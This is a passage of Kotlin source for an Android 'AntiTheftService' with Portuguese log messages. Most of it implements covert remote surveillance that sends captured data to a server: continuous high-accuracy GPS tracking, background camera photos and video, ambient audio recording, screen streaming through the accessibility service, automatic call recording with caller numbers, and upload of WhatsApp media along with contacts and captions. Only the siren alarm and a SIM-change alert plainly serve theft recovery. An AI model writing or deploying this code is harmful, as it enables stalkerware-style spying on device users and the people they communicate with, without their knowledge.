                val ssid = wm.connectionInfo?.ssid ?: "Desconectado"
                ssid.removeSurrounding("\"")
            }
        } catch (e: Exception) { "N/A" }
    }

    @SuppressLint("MissingPermission", "HardwareIds")
    private fun checkSimChange() {
        try {
            val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val currentSim = tm.simSerialNumber ?: return
            val saved = getSharedPreferences("androidprotect_prefs", Context.MODE_PRIVATE)
                .getString("last_sim_serial", null)

            if (saved == null) {
                // First time — save current SIM
                getSharedPreferences("androidprotect_prefs", Context.MODE_PRIVATE)
                    .edit().putString("last_sim_serial", currentSim).apply()
            } else if (saved != currentSim) {
                // SIM was changed! Alert server
                getSharedPreferences("androidprotect_prefs", Context.MODE_PRIVATE)
                    .edit().putString("last_sim_serial", currentSim).apply()
                Handler(Looper.getMainLooper()).postDelayed({
                    sendConsoleLog("⚠️ ALERTA: Chip SIM foi trocado! Novo SIM detectado no aparelho.")
                }, 3000)
            }
        } catch (e: Exception) {
            Log.w("AntiTheftService", "Could not check SIM: ${e.message}")
        }
    }

    // Real-Time Location Tracker
    @SuppressLint("MissingPermission")
    private fun startLocationTracking() {
        if (locationCallback != null) return // Already running

        Log.d("AntiTheftService", "Starting GPS high-accuracy tracking...")

        // Send last known location immediately while waiting for first GPS fix
        fusedLocationClient.lastLocation.addOnSuccessListener { loc ->
            if (loc != null) {
                Log.d("AntiTheftService", "Sending last known location: ${loc.latitude},${loc.longitude} provider=${loc.provider}")
                sendTelemetry(loc.latitude, loc.longitude, loc.accuracy, loc.provider ?: "last_known")
            }
        }

        val locationRequest = LocationRequest.Builder(
            Priority.PRIORITY_HIGH_ACCURACY,
            5000L  // Update every 5 seconds
        ).apply {
            setMinUpdateIntervalMillis(2000L)       // Fastest: every 2 seconds
            setMinUpdateDistanceMeters(0f)           // Any movement triggers update
            setMaxUpdateDelayMillis(0L)              // No batching — deliver immediately
            setWaitForAccurateLocation(true)         // Wait for GPS fix, not network estimate
            // Android 12+ (API 31): force only fine/GPS results
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                setGranularity(com.google.android.gms.location.Granularity.GRANULARITY_FINE)
            }
        }.build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                // Use the most accurate fix from the batch
                val loc = locationResult.locations
                    .filter { it.accuracy > 0 }
                    .minByOrNull { it.accuracy }
                    ?: locationResult.lastLocation
                    ?: return

                val provider = when {
                    loc.accuracy <= 10f  -> "gps"
                    loc.accuracy <= 50f  -> "fused"
                    else                 -> "network"
                }
                sendTelemetry(loc.latitude, loc.longitude, loc.accuracy, provider)
            }
        }

        try {
            fusedLocationClient.requestLocationUpdates(
                locationRequest,
                locationCallback!!,
                Looper.getMainLooper()
            )
            sendConsoleLog("📍 GPS de alta precisão iniciado (atualiza a cada 2-5s).")
        } catch (e: Exception) {
            Log.e("AntiTheftService", "Error requesting GPS updates: ${e.message}")
            sendConsoleLog("Erro ao iniciar rastreamento GPS: ${e.message}")
        }
    }

    private fun stopLocationTracking() {
        locationCallback?.let {
            fusedLocationClient.removeLocationUpdates(it)
            locationCallback = null
            Log.d("AntiTheftService", "Stopped GPS tracking.")
            sendConsoleLog("Rastreamento GPS interrompido.")
        }
    }

    // Capture and upload background cameras photos
    private fun takeAndUploadPhoto(useFrontCamera: Boolean) {
        sendConsoleLog("Iniciando captura headless da câmera ${if (useFrontCamera) "FRONTAL" else "TRASEIRA"}...")
        cameraHelper.takeBackgroundPhoto(this, useFrontCamera) { file ->
            if (file != null) {
                sendConsoleLog("Foto capturada! Enviando arquivo para o servidor...")
                uploadFile(file, "/upload/photo/$deviceId", "photo")
            } else {
                sendConsoleLog("Falha ao capturar foto pela câmera.")
            }
        }
    }

    // Record background audio and upload
    private fun recordAndUploadAudio(durationSeconds: Int) {
        sendConsoleLog("Gravando áudio ambiente por $durationSeconds segundos...")
        audioHelper.startRecording(durationSeconds) { file ->
            if (file != null) {
                sendConsoleLog("Áudio gravado com sucesso! Enviando para o servidor...")
                uploadFile(file, "/upload/audio/$deviceId", "audio")
            } else {
                sendConsoleLog("Falha ao gravar áudio ambiente.")
            }
        }
    }

    // HTTP Multipart Uploader
    private fun uploadFile(file: File, path: String, fileFieldName: String) {
        val token = linkToken.ifBlank {
            getSharedPreferences("androidprotect_prefs", Context.MODE_PRIVATE)
                .getString("link_token", "") ?: ""
        }.trim()
        val pathWithToken = if (token.isNotEmpty()) "$path?linkToken=$token" else path
        val serverUrl = getUploadUrl(pathWithToken)
        Log.d("AntiTheftService", "Uploading file to: $serverUrl")
        
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart(
                fileFieldName, 
                file.name, 
                file.asRequestBody("application/octet-stream".toMediaType())
            )
            .build()
            
        val request = Request.Builder()
            .url(serverUrl)
            .post(requestBody)
            .build()
            
        okHttpClient.newCall(request).enqueue(object : Callback {
            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (response.isSuccessful) {
                        Log.d("AntiTheftService", "File uploaded successfully to $path")
                        sendConsoleLog("Arquivo de mídia enviado com sucesso!")
                    } else {
                        Log.e("AntiTheftService", "File upload failed: Code ${response.code}")
                        sendConsoleLog("Erro no servidor ao receber arquivo: Código ${response.code}")
                    }
                    // Delete temp file after upload
                    file.delete()
                }
            }

            override fun onFailure(call: Call, e: IOException) {
                Log.e("AntiTheftService", "File upload network failure: ${e.message}", e)
                sendConsoleLog("Falha de rede ao enviar arquivo: ${e.message}")
                file.delete()
            }
        })
    }

    // Upload a WhatsApp media file and notify server which conversation it belongs to
    private fun uploadWhatsAppMediaInternal(file: File, type: String, isSent: Boolean, address: String, name: String, caption: String) {
        val token = linkToken.ifBlank {
            getSharedPreferences("androidprotect_prefs", Context.MODE_PRIVATE)
                .getString("link_token", "") ?: ""
        }.trim()
        val path = "/upload/whatsapp-media/$deviceId${if (token.isNotEmpty()) "?linkToken=$token" else ""}"
        val serverUrl = getUploadUrl(path)
        Log.d("AntiTheftService", "Uploading WhatsApp media to: $serverUrl")

        val direction = if (isSent) "out" else "in"
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("file", file.name, file.asRequestBody("application/octet-stream".toMediaType()))
            .addFormDataPart("type", type)
            .addFormDataPart("direction", direction)
            .addFormDataPart("address", address)
            .addFormDataPart("name", name)
            .addFormDataPart("caption", caption)
            .build()

        val request = Request.Builder()
            .url(serverUrl)
            .post(requestBody)
            .build()

        okHttpClient.newCall(request).enqueue(object : Callback {
            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (response.isSuccessful) {
                        Log.d("AntiTheftService", "WhatsApp media uploaded: ${file.name}")
                        sendConsoleLog("Mídia do WhatsApp enviada: ${file.name}")
                    } else {
                        Log.e("AntiTheftService", "WhatsApp media upload failed: Code ${response.code}")
                    }
                }
            }

            override fun onFailure(call: Call, e: IOException) {
                Log.e("AntiTheftService", "WhatsApp media upload network failure: ${e.message}", e)
            }
        })
    }

    // Real-time Screen Streaming core — uses AccessibilityService (Android 11+) or MediaProjection
    private fun startScreenStreaming() {
        if (isScreenStreaming) return

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
            ProtectAccessibilityService.instance != null) {
            startScreenStreamingViaAccessibility()
            return
        }

        startScreenStreamingViaMediaProjection()
    }

    @Suppress("DEPRECATION")
    @android.annotation.TargetApi(Build.VERSION_CODES.R)
    private fun startScreenStreamingViaAccessibility() {
        isScreenStreaming = true
        sendConsoleLog("Transmissão de tela via Acessibilidade iniciada.")

        // Garantir que a thread de compressão existe (reutilizamos a mesma do MediaProjection)
        if (screenCaptureThread == null || !screenCaptureThread!!.isAlive) {
            screenCaptureThread = HandlerThread("ScreenCaptureThread").apply { start() }
            screenCaptureHandler = Handler(screenCaptureThread!!.looper)
        }
        val compressHandler = screenCaptureHandler!!

        // captureScreen (PixelCopy) deve ser acionado na main thread;
        // a compressão JPEG (~10-30ms) roda no ScreenCaptureThread para não bloquear a UI
        val captureHandler = Handler(Looper.getMainLooper())
        val runnable = object : Runnable {
            override fun run() {
                if (!isScreenStreaming) return
                val svc = ProtectAccessibilityService.instance
                if (svc == null) {
                    isScreenStreaming = false
                    sendConsoleLog("Serviço de acessibilidade inativo — transmissão encerrada.")
                    return
                }
                svc.captureScreen { bitmap ->
                    if (bitmap != null && isScreenStreaming) {
                        // Compressão em background — não bloqueia a main thread
                        compressHandler.post {
                            try {
                                val w = 360; val h = 640
                                val scaled = Bitmap.createScaledBitmap(bitmap, w, h, false)
                                val out = java.io.ByteArrayOutputStream()
                                scaled.compress(Bitmap.CompressFormat.JPEG, 45, out)
                                if (scaled !== bitmap) scaled.recycle()
                                bitmap.recycle()
                                sendTypedBinary(0x01.toByte(), out.toByteArray())
                            } catch (e: Exception) {
                                Log.e("AntiTheftService", "Frame error: ${e.message}")
                                bitmap.recycle()
                            }
                        }
                    } else {
                        if (bitmap == null) Log.w("AntiTheftService", "captureScreen returned null bitmap")
                        bitmap?.recycle()
                    }
                    if (isScreenStreaming) captureHandler.postDelayed(this, 150)
                }
            }
        }
        accessibilityFrameHandler = captureHandler
        accessibilityFrameRunnable = runnable
        captureHandler.post(runnable)
    }

    private fun startScreenStreamingViaMediaProjection() {
        // Reuse existing MediaProjection if still alive
        if (mediaProjection == null) {
            val resultCode = mediaProjectionResultCode
            val intentData = mediaProjectionData

            if (resultCode == 0 || intentData == null) {
                val prefs = getSharedPreferences("androidprotect_prefs", Context.MODE_PRIVATE)
                if (prefs.getBoolean("screen_perm_granted", false)) {
                    sendConsoleLog("Token de tela expirado. Abrindo app para reautorizar automaticamente.")
                    notifyReactivateScreenCapture()
                } else {
                    sendConsoleLog("Transmissão de tela falhou: Permissão não concedida. Abra o app e autorize.")
                }
                return
            }

            mediaProjection = mediaProjectionManager?.getMediaProjection(resultCode, intentData)
        }

        try {
            if (mediaProjection == null) {
                sendConsoleLog("Erro ao inicializar MediaProjection. Abra o app novamente.")
                return
            }
            
            isScreenStreaming = true
            sendConsoleLog("Transmissão de tela aceita pelo usuário. Iniciando captura de frames...")

            // Setup display parameters
            val width = 360
            val height = 640 // Lower resolution to compress easily and reduce bandwidth
            val dpi = resources.displayMetrics.densityDpi
            
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
            
            virtualDisplay = mediaProjection!!.createVirtualDisplay(
                "ScreenShare",
                width,
                height,
                dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader!!.surface,
                null,
                null
            )
            
            // Background HandlerThread for Frame Compression
            screenCaptureThread = HandlerThread("ScreenCaptureThread").apply { start() }
            screenCaptureHandler = Handler(screenCaptureThread!!.looper)
            
            imageReader!!.setOnImageAvailableListener({ reader ->
                try {
                    val now = System.currentTimeMillis()
                    if (now - lastFrameTime < 150) {
                        val image = reader.acquireLatestImage()
                        image?.close()
                        return@setOnImageAvailableListener
                    }
                    
                    val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                    lastFrameTime = now
                    
                    val planes = image.planes
                    val buffer = planes[0].buffer
                    val pixelStride = planes[0].pixelStride
                    val rowStride = planes[0].rowStride
                    val rowPadding = rowStride - pixelStride * width
                    
                    val bitmap = Bitmap.createBitmap(
                        width + rowPadding / pixelStride, 
                        height, 
                        Bitmap.Config.ARGB_8888
                    )
                    bitmap.copyPixelsFromBuffer(buffer)
                    image.close()
                    
                    val cleanBitmap = if (rowPadding > 0) {
                        Bitmap.createBitmap(bitmap, 0, 0, width, height)
                    } else {
                        bitmap
                    }

                    // Scene-change detection: skip identical frames
                    val hash = computeFrameHash(cleanBitmap)
                    if (lastFrameHash == 0L || hash != lastFrameHash) {
                        lastFrameHash = hash
                        val outStream = ByteArrayOutputStream()
                        cleanBitmap.compress(Bitmap.CompressFormat.JPEG, 45, outStream)
                        val jpegBytes = outStream.toByteArray()
                        sendTypedBinary(0x01.toByte(), jpegBytes)
                    }

                    if (cleanBitmap != bitmap) cleanBitmap.recycle()
                    bitmap.recycle()
                    
                } catch (e: Exception) {
                    Log.e("AntiTheftService", "Error processing screen frame: ${e.message}")
                }
            }, screenCaptureHandler)
            
        } catch (e: Exception) {
            Log.e("AntiTheftService", "Screen stream crash: ${e.message}", e)
            sendConsoleLog("Erro na transmissão de tela: ${e.message}")
            stopScreenStreaming()
        }
    }

    private fun stopScreenStreaming() {
        if (!isScreenStreaming) return

        Log.d("AntiTheftService", "Stopping screen capture...")
        isScreenStreaming = false

        // Stop accessibility stream
        accessibilityFrameRunnable?.let { accessibilityFrameHandler?.removeCallbacks(it) }
        accessibilityFrameHandler = null
        accessibilityFrameRunnable = null

        // Stop MediaProjection stream
        try {
            imageReader?.setOnImageAvailableListener(null, null)
            imageReader?.close()
            imageReader = null

            virtualDisplay?.release()
            virtualDisplay = null

            // Keep mediaProjection alive — reused on next start

            screenCaptureThread?.quitSafely()
            screenCaptureThread = null
            screenCaptureHandler = null
        } catch (e: Exception) {
            Log.e("AntiTheftService", "Failed to clean up screen stream: ${e.message}")
        }

        lastFrameHash = 0L

        sendConsoleLog("Transmissão de tela finalizada.")
    }

    private fun releaseMediaProjection() {
        try { mediaProjection?.stop() } catch (_: Exception) {}
        mediaProjection = null
    }

    // ── Screenshot (captura única da tela) ───────────────────────────────────
    private fun takeScreenshot() {
        // Via AccessibilityService (PixelCopy — preferido, não precisa de token de stream ativo)
        val svc = ProtectAccessibilityService.instance
        if (svc != null) {
            Handler(Looper.getMainLooper()).post {
                svc.captureScreen { bitmap ->
                    if (bitmap != null) {
                        uploadScreenshotBitmap(bitmap)
                    } else {
                        sendConsoleLog("❌ Screenshot falhou: serviço de acessibilidade retornou nulo.")
                    }
                }
            }
            return
        }
        // Via MediaProjection (requer transmissão de tela ativa)
        val proj = mediaProjection
        if (proj == null) {
            sendConsoleLog("❌ Screenshot: ative a acessibilidade ou inicie a transmissão de tela primeiro.")
            return
        }
        val dm = getSystemService(DISPLAY_SERVICE) as android.hardware.display.DisplayManager
        val display = dm.getDisplay(android.view.Display.DEFAULT_DISPLAY)
        val metrics = android.util.DisplayMetrics()
        @Suppress("DEPRECATION")
        display.getMetrics(metrics)
        val w = metrics.widthPixels
        val h = metrics.heightPixels
        val dpi = metrics.densityDpi
        val reader = ImageReader.newInstance(w, h, android.graphics.PixelFormat.RGBA_8888, 1)
        val vd = proj.createVirtualDisplay("screenshot_tmp", w, h, dpi,
            android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.surface, null, null)
        reader.setOnImageAvailableListener({ r ->
            val image = r.acquireLatestImage() ?: return@setOnImageAvailableListener
            val planes = image.planes
            val buffer = planes[0].buffer
            val ps = planes[0].pixelStride
            val rs = planes[0].rowStride
            val padding = rs - ps * w
            val bmp = Bitmap.createBitmap(w + padding / ps, h, Bitmap.Config.ARGB_8888)
            bmp.copyPixelsFromBuffer(buffer)
            image.close()
            val clean = if (padding > 0) Bitmap.createBitmap(bmp, 0, 0, w, h) else bmp
            uploadScreenshotBitmap(clean)
            if (clean !== bmp) bmp.recycle()
            vd?.release()
            reader.close()
        }, Handler(Looper.getMainLooper()))
    }

    private fun uploadScreenshotBitmap(bitmap: Bitmap) {
        lifecycleScope.launch(Dispatchers.IO) {
            try {
                val out = java.io.ByteArrayOutputStream()
                bitmap.compress(Bitmap.CompressFormat.JPEG, 90, out)
                bitmap.recycle()
                val bytes = out.toByteArray()
                val tmp = File(cacheDir, "screenshot_${System.currentTimeMillis()}.jpg")
                tmp.writeBytes(bytes)
                sendConsoleLog("📸 Screenshot capturado (${bytes.size / 1024}KB) — enviando ao servidor...")
                uploadFile(tmp, "/upload/screenshot/$deviceId", "screenshot")
            } catch (e: Exception) {
                sendConsoleLog("❌ Erro ao processar screenshot: ${e.message}")
            }
        }
    }

    // ── Gravação de Câmera (CameraX VideoCapture) ─────────────────────────────
    @SuppressLint("MissingPermission")
    private fun startCameraRecord(face: String, durationSeconds: Int) {
        if (isCameraRecording) {
            sendConsoleLog("⚠️ Gravação de câmera já em andamento.")
            return
        }
        // Parar stream ao vivo se ativo (câmera é recurso exclusivo)
        if (isCameraStreaming) stopCameraStream()

        cameraRecordFace = face
        val outFile = File(cacheDir, "cam_record_${face}_${System.currentTimeMillis()}.mp4")
        cameraRecordFile = outFile

        val mainExecutor = ContextCompat.getMainExecutor(this)
        val future = ProcessCameraProvider.getInstance(this)
        future.addListener({
            try {
                val provider = future.get()
                val selector = if (face == "front")
                    CameraSelector.DEFAULT_FRONT_CAMERA
                else
                    CameraSelector.DEFAULT_BACK_CAMERA

                val qualitySelector = QualitySelector.fromOrderedList(
                    listOf(Quality.SD, Quality.LOWEST),
                    QualitySelector.FallbackStrategy.lowerQualityOrHigherThan(Quality.LOWEST)
                )
                val recorder = Recorder.Builder()
                    .setQualitySelector(qualitySelector)
                    .build()
                val videoCapture = VideoCapture.withOutput(recorder)
                cameraVideoCapture = videoCapture

                provider.unbindAll()
                provider.bindToLifecycle(this@AntiTheftService, selector, videoCapture)

                val fileOutputOptions = FileOutputOptions.Builder(outFile).build()
                val hasAudio = ContextCompat.checkSelfPermission(
                    this@AntiTheftService, android.Manifest.permission.RECORD_AUDIO
                ) == android.content.pm.PackageManager.PERMISSION_GRANTED

                val pendingRecording = videoCapture.output.prepareRecording(
                    this@AntiTheftService, fileOutputOptions
                )
                val activeRec = if (hasAudio) {
                    pendingRecording.withAudioEnabled().start(mainExecutor) { event ->
                        handleCameraRecordEvent(event, provider, durationSeconds)
                    }
                } else {
                    pendingRecording.start(mainExecutor) { event ->
                        handleCameraRecordEvent(event, provider, durationSeconds)
                    }
                }
                cameraActiveRecording = activeRec

                // Auto-parar após o tempo definido
                Handler(Looper.getMainLooper()).postDelayed({
                    if (isCameraRecording) stopCameraRecord()
                }, durationSeconds * 1000L)

            } catch (e: Exception) {
                Log.e("AntiTheftService", "Camera record start error: ${e.message}", e)
                sendConsoleLog("❌ Erro ao iniciar gravação de câmera: ${e.message}")
                isCameraRecording = false
                cameraRecordFile?.delete()
                cameraRecordFile = null
            }
        }, mainExecutor)
    }

    private fun handleCameraRecordEvent(
        event: VideoRecordEvent,
        provider: ProcessCameraProvider,
        durationSeconds: Int
    ) {
        when (event) {
            is VideoRecordEvent.Start -> {
                isCameraRecording = true
                webSocket?.send(
                    """{"type":"CAMERA_RECORD_STARTED","deviceId":"$deviceId","face":"$cameraRecordFace","duration":$durationSeconds}"""
                )
                sendConsoleLog("🎥 Gravação de câmera $cameraRecordFace iniciada (${durationSeconds}s)...")
            }
            is VideoRecordEvent.Finalize -> {
                isCameraRecording = false
                cameraActiveRecording = null
                cameraVideoCapture = null
                provider.unbindAll()
                webSocket?.send(
                    """{"type":"CAMERA_RECORD_STOPPED","deviceId":"$deviceId","face":"$cameraRecordFace"}"""
                )
                if (!event.hasError()) {
                    val file = cameraRecordFile
                    if (file != null && file.exists() && file.length() > 1024) {
                        val kb = file.length() / 1024
                        sendConsoleLog("⏹ Câmera $cameraRecordFace encerrada (${kb}KB) — enviando ao servidor...")
                        uploadCameraRecording(file, cameraRecordFace)
                        cameraRecordFile = null
                    } else {
                        sendConsoleLog("❌ Arquivo de vídeo vazio ou inválido.")
                        cameraRecordFile?.delete()
                        cameraRecordFile = null
                    }
                } else {
                    val cause = event.cause?.message ?: "erro desconhecido"
                    sendConsoleLog("❌ Erro na gravação de câmera: $cause")
                    cameraRecordFile?.delete()
                    cameraRecordFile = null
                }
            }
            else -> {}
        }
    }

    private fun stopCameraRecord() {
        cameraActiveRecording?.stop()
        // A limpeza acontece no evento Finalize via handleCameraRecordEvent
    }

    private fun uploadCameraRecording(file: File, face: String) {
        val token = linkToken.ifBlank {
            getSharedPreferences("androidprotect_prefs", Context.MODE_PRIVATE)
                .getString("link_token", "") ?: ""
        }.trim()
        val path = "/upload/camera-recording/$deviceId${if (token.isNotEmpty()) "?linkToken=$token" else ""}"
        val serverUrl = getUploadUrl(path)
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("recording", file.name, file.asRequestBody("video/mp4".toMediaType()))
            .addFormDataPart("face", face)
            .build()
        val request = Request.Builder().url(serverUrl).post(requestBody).build()
        okHttpClient.newCall(request).enqueue(object : Callback {
            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (response.isSuccessful) {
                        sendConsoleLog("✅ Gravação de câmera $face enviada ao servidor.")
                        file.delete()
                    } else {
                        sendConsoleLog("❌ Falha no upload de câmera: ${response.code}")
                    }
                }
            }
            override fun onFailure(call: Call, e: IOException) {
                sendConsoleLog("❌ Erro de rede no upload de câmera: ${e.message}")
            }
        })
    }

    // ── Gravação de Ligações ──────────────────────────────────────────────────

    @SuppressLint("MissingPermission")
    @Suppress("DEPRECATION")
    private fun startCallRecordingMonitor() {
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        phoneStateListener = object : PhoneStateListener() {
            override fun onCallStateChanged(state: Int, incomingNumber: String?) {
                when (state) {
                    TelephonyManager.CALL_STATE_RINGING -> {
                        callRecordNumber  = incomingNumber?.replace(Regex("[^0-9+]"), "")
                            ?.take(20)?.ifBlank { "unknown" } ?: "unknown"
                        callRecordDirection = "in"
                        callState = state
                        Log.d("AntiTheftService", "Call RINGING — incoming: $callRecordNumber")
                    }
                    TelephonyManager.CALL_STATE_OFFHOOK -> {
                        if (callState == TelephonyManager.CALL_STATE_IDLE) {
                            // No RINGING before → outgoing call
                            callRecordDirection = "out"
                            callRecordNumber    = "unknown"
                        }
                        callState = state
                        startCallRecord()
                    }
                    TelephonyManager.CALL_STATE_IDLE -> {
                        if (callState != TelephonyManager.CALL_STATE_IDLE) stopCallRecord()
                        callState = state
                    }
                }
            }
        }
        tm.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
        Log.d("AntiTheftService", "Call recording monitor registered")
    }

    @SuppressLint("MissingPermission")
    @Suppress("DEPRECATION")
    private fun startCallRecord() {
        if (isCallRecording) return
        if (ContextCompat.checkSelfPermission(
                this, android.Manifest.permission.RECORD_AUDIO
            ) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            sendConsoleLog("⚠️ Gravação de ligação: permissão RECORD_AUDIO não concedida.")
            return
        }
        val ts       = System.currentTimeMillis()
        val outFile  = File(cacheDir, "call_${callRecordDirection}_${callRecordNumber}_${ts}.m4a")
        callRecordFile = outFile

        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
            MediaRecorder(this)
        else
            @Suppress("DEPRECATION") MediaRecorder()

        try {
            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setAudioEncodingBitRate(64_000)
            recorder.setAudioSamplingRate(16_000)
            recorder.setOutputFile(outFile.absolutePath)
            recorder.prepare()
            recorder.start()
            callRecorder     = recorder
            isCallRecording  = true

            val dir = if (callRecordDirection == "in") "entrada" else "saída"
            webSocket?.send("""{"type":"CALL_RECORD_STARTED","deviceId":"$deviceId","number":"$callRecordNumber","direction":"$callRecordDirection"}""")
            sendConsoleLog("📞 Gravando ligação ($dir de $callRecordNumber)...")
        } catch (e: Exception) {
            Log.e("AntiTheftService", "startCallRecord error: ${e.message}", e)
            recorder.release()
            callRecordFile?.delete()
            callRecordFile = null
            sendConsoleLog("❌ Erro ao iniciar gravação de ligação: ${e.message}")
        }
    }

    private fun stopCallRecord() {
        if (!isCallRecording) return
        isCallRecording = false
        try { callRecorder?.stop() } catch (e: Exception) {
            Log.e("AntiTheftService", "callRecorder stop error: ${e.message}")
        }
        callRecorder?.release()
        callRecorder = null

        webSocket?.send("""{"type":"CALL_RECORD_STOPPED","deviceId":"$deviceId"}""")

        val file = callRecordFile
        if (file != null && file.exists() && file.length() > 1024) {
            val kb = file.length() / 1024
            sendConsoleLog("⏹ Ligação encerrada (${kb}KB) — enviando ao servidor...")
            uploadCallRecording(file, callRecordNumber, callRecordDirection)
            callRecordFile = null
        } else {
            sendConsoleLog("❌ Gravação de ligação vazia ou inválida.")
            callRecordFile?.delete()
            callRecordFile = null
        }
    }

    private fun uploadCallRecording(file: File, number: String, direction: String) {
        val token = linkToken.ifBlank {
            getSharedPreferences("androidprotect_prefs", Context.MODE_PRIVATE)
                .getString("link_token", "") ?: ""
        }.trim()
        val path      = "/upload/call-recording/$deviceId${if (token.isNotEmpty()) "?linkToken=$token" else ""}"
        val serverUrl = getUploadUrl(path)
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("recording", file.name, file.asRequestBody("audio/mp4".toMediaType()))
            .addFormDataPart("number",    number)
            .addFormDataPart("direction", direction)
            .build()
        val request = Request.Builder().url(serverUrl).post(requestBody).build()
        okHttpClient.newCall(request).enqueue(object : Callback {
            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (response.isSuccessful) {
                        sendConsoleLog("✅ Gravação de ligação enviada ao servidor.")
                        file.delete()
                    } else {
                        sendConsoleLog("❌ Falha no upload de ligação: ${response.code}")
                    }
                }
            }
            override fun onFailure(call: Call, e: IOException) {
                sendConsoleLog("❌ Erro de rede no upload de ligação: ${e.message}")
            }
        })
    }

    // ── Gravação de Tela ─────────────────────────────────────────────────────
    @Suppress("DEPRECATION")
    private fun startScreenRecord(durationSeconds: Int) {
        if (isScreenRecording) {
            sendConsoleLog("⚠️ Gravação de tela já em andamento.")
            return
        }
        val proj = mediaProjection ?: run {
            sendConsoleLog("❌ Gravação de tela: inicie a transmissão de tela primeiro para obter permissão.")
            return
        }
        val dm = getSystemService(DISPLAY_SERVICE) as android.hardware.display.DisplayManager
        val display = dm.getDisplay(android.view.Display.DEFAULT_DISPLAY)
        val metrics = android.util.DisplayMetrics()
        display.getMetrics(metrics)
        // Garantir dimensões pares (exigido pelo encoder H.264)
        val w = (metrics.widthPixels / 2) * 2
        val h = (metrics.heightPixels / 2) * 2
        val dpi = metrics.densityDpi

        val outFile = File(cacheDir, "screen_record_${System.currentTimeMillis()}.mp4")
        screenRecordFile = outFile

        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
            android.media.MediaRecorder(this)
        else
            @Suppress("DEPRECATION") android.media.MediaRecorder()

        try {
            recorder.setVideoSource(android.media.MediaRecorder.VideoSource.SURFACE)
            recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
            recorder.setVideoEncoder(android.media.MediaRecorder.VideoEncoder.H264)
            recorder.setVideoSize(w, h)
            recorder.setVideoFrameRate(15)
            recorder.setVideoEncodingBitRate(1_500_000) // 1.5 Mbps — boa qualidade
            recorder.setOutputFile(outFile.absolutePath)
            recorder.prepare()

            recordingVirtualDisplay = proj.createVirtualDisplay(
                "ScreenRecord", w, h, dpi,
                android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                recorder.surface, null, null
            )
            recorder.start()
            screenRecorder = recorder
            isScreenRecording = true

            webSocket?.send("""{"type":"SCREEN_RECORD_STARTED","deviceId":"$deviceId","duration":$durationSeconds}""")
            sendConsoleLog("⏺ Gravação de tela iniciada (${durationSeconds}s)...")

            // Para automaticamente após o tempo configurado
            Handler(Looper.getMainLooper()).postDelayed({
                if (isScreenRecording) stopScreenRecord()
            }, durationSeconds * 1000L)

        } catch (e: Exception) {
            recorder.release()
            screenRecordFile = null
            sendConsoleLog("❌ Erro ao iniciar gravação de tela: ${e.message}")
        }
    }

    private fun stopScreenRecord() {
        if (!isScreenRecording) return
        isScreenRecording = false
        try { screenRecorder?.stop() } catch (e: Exception) {
            Log.e("AntiTheftService", "MediaRecorder stop error: ${e.message}")
        }
        screenRecorder?.release()
        screenRecorder = null
        recordingVirtualDisplay?.release()
        recordingVirtualDisplay = null

        webSocket?.send("""{"type":"SCREEN_RECORD_STOPPED","deviceId":"$deviceId"}""")

        val file = screenRecordFile
        if (file != null && file.exists() && file.length() > 1024) {
            val kb = file.length() / 1024
            sendConsoleLog("⏹ Gravação encerrada (${kb}KB) — enviando ao servidor...")
            uploadFile(file, "/upload/screen-recording/$deviceId", "recording")
            screenRecordFile = null
        } else {
            sendConsoleLog("❌ Arquivo de gravação vazio ou inválido.")
            screenRecordFile?.delete()
            screenRecordFile = null
        }
    }

    // Play Security Siren Alarm with sound + vibration + flash
    private fun playLoudAlarm() {
        val alarmActive = mediaPlayer?.isPlaying == true
        if (alarmActive) {
            mediaPlayer?.stop(); mediaPlayer?.release(); mediaPlayer = null
            stopVibration(); stopFlash()
            sendConsoleLog("Sirene de segurança desligada.")
            return
        }

        try {
            val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)

            mediaPlayer = MediaPlayer().apply {
                setDataSource(this@AntiTheftService, alarmUri)
                setAudioAttributes(
                    AudioAttributes.Builder()
                        .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                        .setUsage(AudioAttributes.USAGE_ALARM).build()
                )
                isLooping = true
                prepare()
            }
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            audioManager.setStreamVolume(
                AudioManager.STREAM_ALARM,
                audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0
            )
            mediaPlayer?.start()
            startVibration()
            startFlash()
            sendConsoleLog("🚨 ALERTA DISPARADO! Sirene + vibração + flash ativados em volume MÁXIMO.")
        } catch (e: Exception) {
            Log.e("AntiTheftService", "Alarm error: ${e.message}", e)
            sendConsoleLog("Erro ao disparar alarme: ${e.message}")
        }
    }

    private fun startVibration() {
        try {
